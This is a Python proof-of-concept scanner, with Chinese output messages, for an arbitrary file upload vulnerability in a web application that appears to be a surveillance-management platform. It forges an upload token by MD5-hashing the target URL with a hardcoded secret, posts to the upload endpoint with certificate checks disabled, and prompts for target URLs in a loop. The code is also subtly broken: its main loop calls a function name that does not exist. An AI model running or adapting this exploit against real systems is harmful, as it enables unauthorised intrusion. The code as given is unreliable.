import requests
import urllib3
import urllib
import hashlib
import argparse
from colorama import init
from colorama import Fore

init(autoreset=True)
urllib3.disable_warnings()

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
}


def md5encode(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/uploadsecretKeyIbuilding"
    else:
        path = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
    encodetext = url + path
    input_name = hashlib.md5()
    input_name.update(encodetext.encode("utf-8"))
    return input_name.hexdigest().upper()


def poc_upload(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/upload?token="
    else:
        path = "/eps/api/resourceOperations/upload?token="
    pocurl = url + path + md5encode(url)
    data = {
        "service": urllib.parse.quote(url + "/home/index.action")
    }
    try:
        response = requests.post(url=pocurl, headers=head, data=data, verify=False, timeout=3)
        if response.status_code == 200:
            print(Fore.GREEN + f"[+]{url}存在任意文件上传漏洞！！！！")
            return True
        else:
            print(Fore.RED + f"[-]{url}不存在任意文件上传漏洞")
            return False
    except:
        pass


if __name__ == '__main__':
    while True:
        input_url = input("请输入URL（输入 q 退出）：")
        if input_url.lower() == "q":
            break
        poc(input_url)
